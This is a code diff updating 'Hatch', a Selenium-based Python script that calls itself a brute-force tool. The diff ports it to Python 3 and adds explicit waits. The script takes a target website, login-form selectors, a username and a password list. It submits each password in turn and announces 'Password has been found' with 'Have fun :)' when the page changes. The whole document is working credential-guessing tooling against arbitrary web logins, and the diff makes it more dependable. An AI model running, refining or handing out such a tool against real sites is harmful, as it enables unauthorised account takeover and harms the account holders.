@@ -10,6 +10,10 @@ from selenium import webdriver
 from optparse import OptionParser
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
 
 
 #Graphics
@@ -46,7 +50,7 @@ parser.add_option("--website", dest="website",help="choose a website")
 
 def wizard():
     print (banner)
-    website = raw_input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
+    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
     sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
     sys.stdout.flush()
     t.sleep(1)
@@ -67,63 +71,53 @@ def wizard():
         print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
         exit()
 
-    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
-    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
-    login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
-    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
-    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
+    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
+    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
+    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
+    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
+    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
 def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
     f = open(pass_list, 'r')
-    driver = webdriver.Chrome()
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
-    count = 1 #count
     browser = webdriver.Chrome(chrome_options=optionss)
+    wait = WebDriverWait(browser, 10)
     while True:
         try:
             for line in f:
                 browser.get(website)
-                t.sleep(2)
+                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                 Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                 Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                 enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
-                # browser.find_element_by_css_selector(password_selector).clear()
-                # browser.find_element_by_css_selector(username_selector).clear()
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
-                print '------------------------'
+                print ('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
-                print '------------------------'
+                print ('------------------------')
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
-            exit()
+            print('CTRL C')
+            break
         except selenium.common.exceptions.NoSuchElementException:
-            print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! '
-            print 'LAST PASS ATTEMPT BELLOW'
-            print color.GREEN + 'Password has been found: {0}'.format(line)
-            print color.YELLOW + 'Have fun :)'
+            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+            print ('LAST PASS ATTEMPT BELLOW')
+            print (color.GREEN + 'Password has been found: {0}'.format(line))
+            print (color.YELLOW + 'Have fun :)')
             exit()
-
-
 
 banner = color.BOLD + color.RED +'''
   _    _       _       _
  | |  | |     | |     | |
- | |__| | __ _| |_ ___| |__ 
+ | |__| | __ _| |_ ___| |__
  |  __  |/ _` | __/ __| '_ \\
  | |  | | (_| | || (__| | | |
  |_|  |_|\__,_|\__\___|_| |_|
   {0}[{1}-{2}]--> {3}V.1.0
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
-
-driver = webdriver.Chrome()
-optionss = webdriver.ChromeOptions()
-optionss.add_argument("--disable-popup-blocking")
-optionss.add_argument("--disable-extensions")
-count = 1 #count
 
 if options.username == None:
     if options.usernamesel == None:
@@ -140,7 +134,7 @@ password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
 pass_list = options.passlist
-print banner
+print (banner)
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
 
